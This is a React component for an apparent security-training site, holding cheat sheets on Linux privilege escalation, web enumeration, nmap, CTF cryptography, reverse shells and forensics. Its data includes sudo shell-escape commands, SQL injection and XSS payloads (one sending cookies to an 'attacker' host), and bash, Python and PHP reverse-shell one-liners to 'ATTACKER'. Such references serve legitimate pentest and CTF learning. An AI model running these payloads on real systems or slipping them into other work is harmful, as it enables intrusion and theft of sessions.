import { useState } from 'react'
import styles from './Cheatsheets.module.css'

const CHEATSHEETS = [
  {
    id: 'linux-privesc',
    title: 'Linux Privilege Escalation',
    category: 'linux',
    icon: '🐧',
    desc: 'Common vectors: SUID, sudo, cron, writable paths, kernel exploits.',
    sections: [
      {
        title: 'Enumeration',
        commands: [
          { cmd: 'id && whoami', desc: 'Current user & groups' },
          { cmd: 'uname -a && cat /etc/os-release', desc: 'OS / kernel version' },
          { cmd: 'find / -perm -u=s -type f 2>/dev/null', desc: 'SUID binaries' },
          { cmd: 'sudo -l', desc: 'Sudo permissions' },
          { cmd: 'crontab -l; ls /etc/cron*', desc: 'Cron jobs' },
          { cmd: 'cat /etc/passwd | grep -v nologin', desc: 'Valid login users' },
          { cmd: 'ss -tlnp', desc: 'Listening ports' },
          { cmd: 'ps aux', desc: 'Running processes' },
        ]
      },
      {
        title: 'GTFObins Quick Wins',
        commands: [
          { cmd: 'sudo vim -c \':!/bin/sh\'', desc: 'vim → shell' },
          { cmd: 'sudo find . -exec /bin/sh \\;', desc: 'find → shell' },
          { cmd: 'sudo python3 -c \'import os; os.system("/bin/bash")\'', desc: 'python → shell' },
          { cmd: 'sudo awk \'BEGIN {system("/bin/sh")}\'', desc: 'awk → shell' },
        ]
      }
    ]
  },
  {
    id: 'web-enum',
    title: 'Web Enumeration',
    category: 'web',
    icon: '🌐',
    desc: 'Directory busting, header recon, SQLi, XSS, and common web attack patterns.',
    sections: [
      {
        title: 'Directory / File Discovery',
        commands: [
          { cmd: 'gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt', desc: 'Gobuster dir scan' },
          { cmd: 'ffuf -u http://TARGET/FUZZ -w wordlist.txt -fc 404', desc: 'FFUF (filter 404s)' },
          { cmd: 'feroxbuster -u http://TARGET --depth 3', desc: 'Feroxbuster recursive' },
        ]
      },
      {
        title: 'SQL Injection',
        commands: [
          { cmd: "' OR 1=1--", desc: 'Auth bypass' },
          { cmd: "' UNION SELECT NULL,NULL,NULL--", desc: 'Column count test' },
          { cmd: 'sqlmap -u "http://target/?id=1" --dbs', desc: 'SQLMap DB dump' },
          { cmd: "' AND SLEEP(5)--", desc: 'Blind SQLi time-based' },
        ]
      },
      {
        title: 'XSS Payloads',
        commands: [
          { cmd: '<script>alert(document.cookie)</script>', desc: 'Basic XSS' },
          { cmd: '<img src=x onerror=fetch(`//attacker/`+document.cookie)>', desc: 'Cookie steal' },
          { cmd: '<svg onload=alert(1)>', desc: 'SVG XSS' },
        ]
      }
    ]
  },
  {
    id: 'nmap',
    title: 'Nmap Reference',
    category: 'recon',
    icon: '📡',
    desc: 'Port scanning, service detection, NSE scripts, and stealth options.',
    sections: [
      {
        title: 'Common Scans',
        commands: [
          { cmd: 'nmap -sV -sC -oA scan TARGET', desc: 'Default service + scripts, save all formats' },
          { cmd: 'nmap -p- --min-rate 5000 TARGET', desc: 'All 65535 ports, fast' },
          { cmd: 'nmap -sU -top-ports 100 TARGET', desc: 'Top 100 UDP ports' },
          { cmd: 'nmap -A -p 80,443,8080 TARGET', desc: 'Aggressive on specific ports' },
          { cmd: 'nmap -sS -T4 TARGET', desc: 'SYN scan (stealth)' },
        ]
      },
      {
        title: 'Useful NSE Scripts',
        commands: [
          { cmd: 'nmap --script vuln TARGET', desc: 'Run vuln scripts' },
          { cmd: 'nmap --script smb-enum-shares TARGET', desc: 'SMB share enum' },
          { cmd: 'nmap --script http-title TARGET', desc: 'HTTP page titles' },
          { cmd: 'nmap --script ftp-anon TARGET', desc: 'Anonymous FTP check' },
        ]
      }
    ]
  },
  {
    id: 'crypto',
    title: 'Cryptography CTF',
    category: 'crypto',
    icon: '🔐',
    desc: 'RSA attacks, encoding tricks, hash cracking, classic cipher identification.',
    sections: [
      {
        title: 'RSA Attacks',
        commands: [
          { cmd: 'python3 -c "from Crypto.Util.number import *; print(long_to_bytes(pow(c,d,n)))"', desc: 'Basic RSA decrypt' },
          { cmd: 'RsaCtfTool.py --publickey key.pem --uncipherfile flag.enc', desc: 'RsaCtfTool auto attack' },
          { cmd: 'msieve -v -e factor N', desc: 'Factor with msieve' },
        ]
      },
      {
        title: 'Encoding / Hashing',
        commands: [
          { cmd: "echo -n 'text' | base64", desc: 'Base64 encode' },
          { cmd: "echo 'dGVzdA==' | base64 -d", desc: 'Base64 decode' },
          { cmd: "echo -n 'text' | md5sum", desc: 'MD5 hash' },
          { cmd: 'hashcat -m 0 hash.txt rockyou.txt', desc: 'Crack MD5 with hashcat' },
          { cmd: 'john --wordlist=rockyou.txt hash.txt', desc: 'John the Ripper' },
        ]
      }
    ]
  },
  {
    id: 'reverse-shells',
    title: 'Reverse Shells',
    category: 'pwn',
    icon: '🐚',
    desc: 'One-liners for bash, python, php, nc, powershell. Always stabilize your shell.',
    sections: [
      {
        title: 'Listeners',
        commands: [
          { cmd: 'nc -lvnp 4444', desc: 'Netcat listener' },
          { cmd: 'rlwrap nc -lvnp 4444', desc: 'Netcat + readline (arrow keys)' },
        ]
      },
      {
        title: 'Shells',
        commands: [
          { cmd: 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1', desc: 'Bash reverse shell' },
          { cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'', desc: 'Python reverse shell' },
          { cmd: 'php -r \'$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'', desc: 'PHP reverse shell' },
        ]
      },
      {
        title: 'Shell Stabilization',
        commands: [
          { cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'', desc: 'Step 1: Spawn PTY' },
          { cmd: 'Ctrl+Z  →  stty raw -echo; fg', desc: 'Step 2: Raw mode' },
          { cmd: 'export TERM=xterm; stty rows 38 cols 136', desc: 'Step 3: Fix size' },
        ]
      }
    ]
  },
  {
    id: 'forensics',
    title: 'Forensics & Steganography',
    category: 'forensics',
    icon: '🔍',
    desc: 'File analysis, metadata extraction, hidden data in images and audio.',
    sections: [
      {
        title: 'File Analysis',
        commands: [
          { cmd: 'file suspicious', desc: 'Identify file type' },
          { cmd: 'strings suspicious | grep -i flag', desc: 'Extract strings' },
          { cmd: 'binwalk -e archive.png', desc: 'Extract embedded files' },
          { cmd: 'xxd file | head', desc: 'Hex dump' },
          { cmd: 'exiftool image.jpg', desc: 'Extract metadata' },
        ]
      },
      {
        title: 'Steganography',
        commands: [
          { cmd: 'steghide extract -sf image.jpg', desc: 'Extract from JPEG' },
          { cmd: 'zsteg image.png', desc: 'LSB steg in PNG' },
          { cmd: 'stegsolve image.png', desc: 'Visual steg analysis' },
          { cmd: 'foremost -i disk.img', desc: 'File carving' },
        ]
      }
    ]
  },
]

const CATEGORIES = ['all', ...new Set(CHEATSHEETS.map(c => c.category))]

export default function Cheatsheets() {
  const [active, setActive] = useState(null)
  const [search, setSearch] = useState('')
  const [category, setCategory] = useState('all')
  const [copied, setCopied] = useState('')

  const filtered = CHEATSHEETS.filter(cs => {
    const q = search.toLowerCase()
    const matchSearch = !q || cs.title.toLowerCase().includes(q) || cs.desc.toLowerCase().includes(q)
    const matchCat = category === 'all' || cs.category === category
    return matchSearch && matchCat
  })

  const copy = (cmd) => {
    navigator.clipboard.writeText(cmd)
    setCopied(cmd)
    setTimeout(() => setCopied(''), 2000)
  }

  const current = CHEATSHEETS.find(c => c.id === active)

  return (
    <div className={`${styles.page} page-enter`}>
      <div className={styles.layout}>
        {/* Left panel */}
        <aside className={styles.sidebar}>
          <div className={styles.sidebarHeader}>
            <h1 className={styles.sidebarTitle}>Cheatsheets</h1>
            <p className={styles.sidebarDesc}>Quick references for common sec tasks</p>

            <input
              className={styles.search}
              type="text"
              placeholder="Search..."
              value={search}
              onChange={e => setSearch(e.target.value)}
            />

            <div className={styles.cats}>
              {CATEGORIES.map(c => (
                <button
                  key={c}
                  className={`${styles.cat} ${category === c ? styles.catActive : ''}`}
                  onClick={() => setCategory(c)}
                >
                  {c}
                </button>
              ))}
            </div>
          </div>

          <nav className={styles.list}>
            {filtered.map(cs => (
              <button
                key={cs.id}
                className={`${styles.item} ${active === cs.id ? styles.itemActive : ''}`}
                onClick={() => setActive(cs.id)}
              >
                <span className={styles.itemIcon}>{cs.icon}</span>
                <div className={styles.itemText}>
                  <span className={styles.itemTitle}>{cs.title}</span>
                  <span className={styles.itemCat}>{cs.category}</span>
                </div>
              </button>
            ))}
          </nav>
        </aside>

        {/* Right panel */}
        <main className={styles.content}>
          {!current ? (
            <div className={styles.empty}>
              <div className={styles.emptyTerm}>
                <span className={styles.cGreen}>➜</span> <span className={styles.cBlue}>~/cheatsheets</span>
                <span className={styles.blink}> ▋</span>
              </div>
              <p>Select a cheatsheet from the sidebar</p>
            </div>
          ) : (
            <div className={styles.cheatsheet}>
              <div className={styles.csHeader}>
                <span className={styles.csIcon}>{current.icon}</span>
                <div>
                  <h2 className={styles.csTitle}>{current.title}</h2>
                  <p className={styles.csDesc}>{current.desc}</p>
                </div>
                <span className={`tag ${styles.csCat}`}>{current.category}</span>
              </div>

              {current.sections.map(section => (
                <div key={section.title} className={styles.section}>
                  <h3 className={styles.sectionTitle}>{section.title}</h3>
                  <div className={styles.commands}>
                    {section.commands.map(({ cmd, desc }) => (
                      <div key={cmd} className={styles.cmdBlock}>
                        <div className={styles.cmdTop}>
                          <span className={styles.cmdDesc}>{desc}</span>
                          <button
                            className={`${styles.copyBtn} ${copied === cmd ? styles.copied : ''}`}
                            onClick={() => copy(cmd)}
                          >
                            {copied === cmd ? '✓ copied' : 'copy'}
                          </button>
                        </div>
                        <pre className={styles.cmd}><code>{cmd}</code></pre>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          )}
        </main>
      </div>
    </div>
  )
}
